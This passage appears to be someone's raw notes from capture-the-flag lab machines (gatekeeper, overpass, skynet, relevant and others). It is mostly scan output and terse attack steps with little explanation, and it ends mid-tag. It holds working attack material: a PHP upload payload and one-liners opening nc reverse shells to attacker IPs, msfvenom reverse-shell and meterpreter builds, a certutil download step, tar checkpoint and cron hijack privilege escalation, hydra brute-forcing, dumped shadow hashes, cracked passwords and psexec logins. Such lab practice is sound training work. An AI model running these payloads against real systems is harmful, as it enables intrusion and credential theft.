unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port31337-TCP:V=7.91%I=7%D=5/12%Time=609C03DE%P=x86_64-pc-linux-gnu%r(G<br />SF:etRequest,24,&quot;Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n&quot;)%r<br />SF:(SIPOptions,142,&quot;Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20<br />SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20&lt;sip:nm@n<br />SF:m&gt;;tag=root\r!!!\nHello\x20To:\x20&lt;sip:nm2@nm2&gt;\r!!!\nHello\x20Call-ID:<br />SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw<br />SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:<br />SF:\x20&lt;sip:nm@nm&gt;\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x<br />SF:20\r!!!\n&quot;)%r(GenericLines,16,&quot;Hello\x20\r!!!\nHello\x20\r!!!\n&quot;)%r(HTT<br />SF:POptions,28,&quot;Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n&quot;<br />SF:)%r(RTSPRequest,28,&quot;Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\<br />SF:r!!!\n&quot;)%r(Help,F,&quot;Hello\x20HELP\r!!!\n&quot;)%r(SSLSessionReq,C,&quot;Hello\x20\<br />SF:x16\x03!!!\n&quot;)%r(TerminalServerCookie,B,&quot;Hello\x20\x03!!!\n&quot;)%r(TLSSess<br />SF:ionReq,C,&quot;Hello\x20\x16\x03!!!\n&quot;)%r(Kerberos,A,&quot;Hello\x20!!!\n&quot;)%r(Fou<br />SF:rOhFourRequest,47,&quot;Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba<br />SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n&quot;)%r(LPDString,12,&quot;Hello\x20\x01de<br />SF:fault!!!\n&quot;)%r(LDAPSearchReq,17,&quot;Hello\x200\x84!!!\nHello\x20\x01!!!\n&quot;<br />SF:);<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/12%OT=135%CT=1%CU=36050%PV=Y%DS=2%DC=T%G=Y%TM=609C04<br />OS:85%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=O%TS<br />OS:=7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M<br />OS:505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20<br />OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=<br />OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y<br />OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD<br />OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0<br />OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1<br />OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI<br />OS:=N%T=80%CD=Z)<br /><br />Network Distance: 2 hops<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s<br />|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:ec:ad:2c:cc:25 (unknown)<br />| smb-os-discovery: <br />|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)<br />|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional<br />|   Computer name: gatekeeper<br />|   NetBIOS computer name: GATEKEEPER\x00<br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2021-05-12T12:38:22-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2021-05-12T16:38:22<br />|_  start_date: 2021-05-12T16:31:56<br /><br />TRACEROUTE (using port 80/tcp)<br />HOP RTT      ADDRESS<br />1   75.19 ms 10.11.0.1<br />2   74.74 ms 10.10.80.155<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 416.29 seconds<br /><br />smb<br />gatekeeper.exe bof<br /><br /><br />seatbelt.exe<br /><br />natbat<br />as5CQC4Iq1eppKRu<br /><br />└─# python3 firefox_decrypt.py /home/kali/Desktop/gatekeeper<br />2021-05-12 23:26:02,520 - WARNING - profile.ini not found in /home/kali/Desktop/gatekeeper<br />2021-05-12 23:26:02,521 - WARNING - Continuing and assuming &#39;/home/kali/Desktop/gatekeeper&#39; is a profile location<br /><br />Website:   <a href="https://creds.com">https://creds.com</a><br />Username: &#39;mayor&#39;<br />Password: &#39;8CL7O1N78MdrCIsV&#39;<br />                                  <br />                                  <br />                                  <br />psexec.py GATEKEEPER/mayor:8CL7O1N78MdrCIsV@10.10.44.163 cmd.exe<br /></div><div class='page'><h1 class='title level-2'>overpass.thm</h1><br/>└─# nikto -h 10.10.33.201      <br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.33.201<br />+ Target Hostname:    10.10.33.201<br />+ Target Port:        80<br />+ Start Time:         2021-05-06 00:42:05 (GMT3)<br />---------------------------------------------------------------------------<br />+ Server: No banner retrieved<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-3092: /admin.html: This might be interesting...<br />+ OSVDB-3092: /admin/: This might be interesting...<br />+ OSVDB-3092: /css/: This might be interesting...<br />+ OSVDB-3092: /downloads/: This might be interesting...<br />+ OSVDB-3092: /img/: This might be interesting...<br />+ 7890 requests: 0 error(s) and 9 item(s) reported on remote host<br />+ End Time:           2021-05-06 00:53:31 (GMT3) (686 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /><br /><br />└─# nmap -A 10.10.33.201 -p-<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-06 00:16 +03<br />Stats: 0:06:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 82.92% done; ETC: 00:24 (0:01:18 remaining)<br />Stats: 0:07:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 91.95% done; ETC: 00:24 (0:00:37 remaining)<br />Nmap scan report for 10.10.33.201<br />Host is up (0.081s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)<br />|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)<br />|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)<br />80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)<br />|_http-title: Overpass<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/6%OT=22%CT=1%CU=41174%PV=Y%DS=2%DC=T%G=Y%TM=60930D30<br />OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M5<br />OS:05ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O<br />OS:6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%D<br />OS:F=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0<br />OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=<br />OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%<br />OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I<br />OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 8888/tcp)<br />HOP RTT      ADDRESS<br />1   77.92 ms 10.11.0.1<br />2   79.54 ms 10.10.33.201<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 499.93 seconds<br /><br /><br /><br />cookie.js ⇒ js control, bypass with burp suite<br /><br /><br />admin panel has rsa key<br />crack it with john<br /><br /><br /><br />james13<br /><br />james saydrawnlyingpicture<br /><br />/etc/hosts ⇒ universally writable!<br /><br />crontab has a script that runs every minute ( * * * * means every min )<br /><br />change /etc/hosts to your ip it will get that file and execute!</div><div class='page'><h1 class='title level-2'>overpass2.thm</h1><br/>)n)ºHEô<br />.@@VTÀ¨ªÀ¨ªºvPÃró:&#39;ö©ó<br />Â¦+5P,ÆPOST /development/upload.php HTTP/1.1<br />Host: 192.168.170.159<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Referer: <a href="http://192.168.170.159/development/">http://192.168.170.159/development/</a><br />Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006<br />Content-Length: 454<br />Connection: keep-alive<br />Upgrade-Insecure-Requests: 1<br /><br />-----------------------------1809049028579987031515260006<br />Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;payload.php&quot;<br />Content-Type: application/x-php<br /><br />&lt;?php exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&quot;)?&gt;<br /><br />-----------------------------1809049028579987031515260006<br />Content-Disposition: form-data; name=&quot;submit&quot;<br /><br />Upload File<br />-----------------------------1809049028579987031515260006--<br /><br /><br />)ºH)nEê®½@@¯ÎÀ¨ªÀ¨ªáP	aµdg§Õ1öÜ^<br />5QÂýøroot:*:18295:0:99999:7:::<br />daemon:*:18295:0:99999:7:::<br />bin:*:18295:0:99999:7:::<br />sys:*:18295:0:99999:7:::<br />sync:*:18295:0:99999:7:::<br />games:*:18295:0:99999:7:::<br />man:*:18295:0:99999:7:::<br />lp:*:18295:0:99999:7:::<br />mail:*:18295:0:99999:7:::<br />news:*:18295:0:99999:7:::<br />uucp:*:18295:0:99999:7:::<br />proxy:*:18295:0:99999:7:::<br />www-data:*:18295:0:99999:7:::<br />backup:*:18295:0:99999:7:::<br />list:*:18295:0:99999:7:::<br />irc:*:18295:0:99999:7:::<br />gnats:*:18295:0:99999:7:::<br />nobody:*:18295:0:99999:7:::<br />systemd-network:*:18295:0:99999:7:::<br />systemd-resolve:*:18295:0:99999:7:::<br />syslog:*:18295:0:99999:7:::<br />messagebus:*:18295:0:99999:7:::<br />_apt:*:18295:0:99999:7:::<br />lxd:*:18295:0:99999:7:::<br />uuidd:*:18295:0:99999:7:::<br />dnsmasq:*:18295:0:99999:7:::<br />landscape:*:18295:0:99999:7:::<br />pollinate:*:18295:0:99999:7:::<br />sshd:*:18464:0:99999:7:::<br />james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::<br />paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::<br />szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::<br />bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::<br />muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::<br /><br />using fasttrack.txt<br /><br />secret12         (bee)<br />abcd123          (szymex)<br />1qaz2wsx         (muirland)<br />secuirty3        (paradox)<br /><br /><br />james<br />whenevernoteartinstant<br />)ºH)nEg®@@µaÀ¨ªÀ¨ªáP	a°çg§ÔÏöó<br />5PÛaÂTÆ,LQ?2&gt;6QiQ$JDE6&gt;Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN. (Rot47)<br /><br /><br />)ºH)nEk®À@@µJÀ¨ªÀ¨ªáP	a»7g§Õeöí<br />5R½Â!&lt;git clone <a href="https://github.com/NinjaJc01/ssh-backdoor">https://github.com/NinjaJc01/ssh-backdoor</a><br /><br /><br />)n)ºHEÃw¡@@ìÀ¨ªÀ¨ªáPg§Õ	aÈõz0<br />ÂSj5R ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed<br /><br /><br />hashcat -m 1710 over2.txt /usr/share/wordlists/rockyou.txt -a 0<br /><br />6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16<br /><br /><br /><br />ssh 10.10.229.158 -p 2222<br />november16<br /><br /><br />./.suid_bash -p</div><div class='page'><h1 class='title level-2'>mr robot.thm</h1><br/><br /><br /><br />log=test&amp;pwd=pass&amp;wp-submit=Log+In&amp;redirect_to=https%3A%2F%2F10.10.244.178%2Fwp-admin%2F&amp;testcookie=1<br /><br /><br /><br />└─# hydra -l elliot -P fs.dic 10.10.244.178 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=https%3A%2F%2F10.10.244.178%2Fwp-admin%2F&amp;testcookie=1:S=302&quot; -I<br />robot:abcdefghijklmnopqrstuvwxyz</div><div class='page'><h1 class='title level-2'>skynet.thm</h1><br/>A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.<br />-Miles Dyson<br /><br /><br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-01 21:12 +03<br />Warning: 10.10.18.145 giving up on port because retransmission cap hit (2).<br />Stats: 0:05:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 56.16% done; ETC: 21:21 (0:03:57 remaining)<br />Nmap scan report for 10.10.18.145<br />Host is up (0.098s latency).<br />Not shown: 65390 closed ports, 139 filtered ports<br />PORT    STATE SERVICE     VERSION<br />22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br />80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))<br />110/tcp open  pop3        Dovecot pop3d<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />143/tcp open  imap        Dovecot imapd<br />445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br /><br />login_username=milesdyson&amp;secretkey=test&amp;js_autodetect_results=1&amp;just_logged_in=1<br /><br /><br /><br />smbclient //10.10.18.145/anonymous<br /><br /><br />smbclient //10.10.18.145/milesdyson -U &#39;milesdyson&#39;   <br /><br />/45kra24zxs28v3yd<br /><br /><br /><br /><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</code><br /><code>chmod +x /home/user/shell.elf</code><br /><code>touch /home/user/--checkpoint=1<br />touch /home/user/--checkpoint-action=exec=shell.elf</code><br /><br /><br /><br />echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.14.10.119 6667 &gt;/tmp/f&quot; &gt; test.sh</div><div class='page'><h1 class='title level-2'>daily bugle.thm</h1><br/>Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-01 23:25 +03<br /><br />Nmap scan report for 10.10.140.65<br />Host is up (0.075s latency).<br />Not shown: 65532 closed ports<br />PORT     STATE SERVICE   VERSION<br />22/tcp   open  ssh       OpenSSH 7.4 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)<br />|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)<br />|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)<br />80/tcp   open  ssl/http?<br />| http-robots.txt: 15 disallowed entries <br />| /joomla/administrator/ /administrator/ /bin/ /cache/ <br />| /cli/ /components/ /includes/ /installation/ /language/ <br />|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/<br />3306/tcp open  mysql     MariaDB (unauthorized)<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/1%OT=22%CT=1%CU=38131%PV=Y%DS=2%DC=T%G=Y%TM=608DBACE<br />OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%II=I%TS=A)SEQ(SP=10<br />OS:4%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3<br />OS:=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=6<br />OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW<br />OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF<br />OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=<br />OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=<br />OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI<br />OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br /><br />TRACEROUTE (using port 995/tcp)<br />HOP RTT      ADDRESS<br />1   72.46 ms 10.14.0.1<br />2   72.54 ms 10.10.140.65<br /><br />joomscan  (github)<br />joomblah-3 (github)<br />spiderman123<br /><br /><br />cat /var/html/configuration.php<br />jjameson<br />nv5uz9r3ZEDzVjNu<br /><br /><br />sudo -l<br /><br />fpm -n root -s dir -t rpm -t rpm -a all --before-install /tmp/rpmdemo/root.sh /tmp/rpdemo</div><div class='page'><h1 class='title level-2'>retro.thm</h1><br/>└─# nmap -A -p- 10.10.2.154 -Pn<br />Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-14 23:33 +03<br />Nmap scan report for 10.10.2.154<br />Host is up (0.087s latency).<br />Not shown: 65533 filtered ports<br />PORT     STATE SERVICE            VERSION<br />80/tcp   open  http               Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: IIS Windows Server<br />3389/tcp open  ssl/ms-wbt-server?<br />| rdp-ntlm-info: <br />|   Target_Name: RETROWEB<br />|   NetBIOS_Domain_Name: RETROWEB<br />|   NetBIOS_Computer_Name: RETROWEB<br />|   DNS_Domain_Name: RetroWeb<br />|   DNS_Computer_Name: RetroWeb<br />|   Product_Version: 10.0.14393<br />|_  System_Time: 2021-05-14T20:37:17+00:00<br />| ssl-cert: Subject: commonName=RetroWeb<br />| Not valid before: 2021-05-13T20:29:27<br />|_Not valid after:  2021-11-12T20:29:27<br />|_ssl-date: 2021-05-14T20:37:19+00:00; +1s from scanner time.<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />Device type: general purpose<br />Running (JUST GUESSING): Microsoft Windows 2016 (88%)<br />OS CPE: cpe:/o:microsoft:windows_server_2016<br />Aggressive OS guesses: Microsoft Windows Server 2016 (88%)<br />No exact OS matches for host (test conditions non-ideal).<br />Network Distance: 2 hops<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />TRACEROUTE (using port 80/tcp)<br />HOP RTT      ADDRESS<br />1   85.82 ms 10.11.0.1<br />2   87.45 ms 10.10.2.154<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 232.48 seconds<br /><br /><br /></div><div class='page'><h1 class='title level-2'>Relevant.thm</h1><br/>─# nmap -A 10.10.237.144 -p-            <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-09 00:24 +03<br />Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 49.90% done; ETC: 00:26 (0:01:12 remaining)<br />Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 50.08% done; ETC: 00:26 (0:01:12 remaining)<br />Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 99.39% done; ETC: 00:26 (0:00:01 remaining)<br />Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br />Service scan Timing: About 75.00% done; ETC: 00:26 (0:00:07 remaining)<br />Stats: 0:03:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br />NSE Timing: About 99.91% done; ETC: 00:27 (0:00:00 remaining)<br />Nmap scan report for 10.10.237.144<br />Host is up (0.099s latency).<br />Not shown: 65527 filtered ports<br />PORT      STATE SERVICE       VERSION<br />80/tcp    open  http          Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: IIS Windows Server<br />135/tcp   open  msrpc         Microsoft Windows RPC<br />139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br />445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds<br />3389/tcp  open  ms-wbt-server Microsoft Terminal Services<br />| rdp-ntlm-info: <br />|   Target_Name: RELEVANT<br />|   NetBIOS_Domain_Name: RELEVANT<br />|   NetBIOS_Computer_Name: RELEVANT<br />|   DNS_Domain_Name: Relevant<br />|   DNS_Computer_Name: Relevant<br />|   Product_Version: 10.0.14393<br />|_  System_Time: 2021-05-08T21:27:33+00:00<br />| ssl-cert: Subject: commonName=Relevant<br />| Not valid before: 2021-05-07T21:23:48<br />|_Not valid after:  2021-11-06T21:23:48<br />|_ssl-date: 2021-05-08T21:28:11+00:00; -1s from scanner time.<br />49663/tcp open  http          Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: IIS Windows Server<br />49667/tcp open  msrpc         Microsoft Windows RPC<br />49669/tcp open  msrpc         Microsoft Windows RPC<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />Device type: general purpose<br />Running (JUST GUESSING): Microsoft Windows 2016 (90%)<br />OS CPE: cpe:/o:microsoft:windows_server_2016<br />Aggressive OS guesses: Microsoft Windows Server 2016 (90%)<br />No exact OS matches for host (test conditions non-ideal).<br />Network Distance: 2 hops<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: -1s<br />| smb-os-discovery: <br />|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)<br />|   Computer name: Relevant<br />|   NetBIOS computer name: RELEVANT\x00<br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2021-05-08T14:27:32-07:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2021-05-08T21:27:33<br />|_  start_date: 2021-05-08T21:24:09<br /><br />TRACEROUTE (using port 80/tcp)<br />HOP RTT       ADDRESS<br />1   80.51 ms  10.11.0.1<br />2   115.11 ms 10.10.237.144<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 225.61 seconds<br />                                                                       <br />                                                                       <br />smbmap -H 10.10.237.144 -u &#39;anonymous&#39;        <br /><br />smbclient //10.10.237.144/IPC$ -U &#39;anonymous&#39;<br /><br />                                             <br />smbclient //10.10.237.144/nt4wrksv$ -U &#39;anonymous&#39;<br /><br />Bob - !P@$$W0rD!123 <br />Bill - Juw4nnaM4n420696969!$$$<br /><br />smbmap -H 10.10.237.144 -u &#39;Bob&#39; -p &#39;!P@$$W0rD!123&#39;<br />                                                  <br />psexec.py &#39;RELEVANT\Bill:Juw4nnaM4n420696969!$$$&#39;@10.10.237.144      <br />                            <br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.17.106LPORT=445 -f exe -o shell_reverse_tcp.exe</code><br /><br />msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.17.106 LPORT=6666 -f aspx -o shell.aspx</div><div class='page'><h1 class='title level-2'>alfred.thm</h1><br/></div><div class='page'><h1 class='title level-1'>Other Boxes</h1><br/></div><div class='page'><h1 class='title level-2'>webmngr.privia</h1><br/>rusty_joomla (metasploit works)<br /><br />net users<br /><br />find /spin “websvc” *.txt<br /><br /><br />AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt:1:net user websvc HaBhRynd95M2<br /><br />$2y$10$M/AB9JROBGMkEoeJBOqyoe59P3HG4EtaKBYdxhENBJY69M215ggyi<br /><br /><br />msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=192.100.0.11 LPORT=80 -f exe -o mgmt.exe<br /><br />certutil.exe -urlcache -split -f <a href="http://192.100.0.13/mgmt2.exe">http://192.100.0.11/mgmt.ex</a>e<br /><br /><br />msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.100.0.11 LPORT=443 -f exe &gt; x64.exe<br /><br /><br /><a href="https://www.youtube.com/watch?v=RW5l6dQ8H-8">https://www.youtube.com/watch?v=RW5l6dQ8H-8</a><br /><a 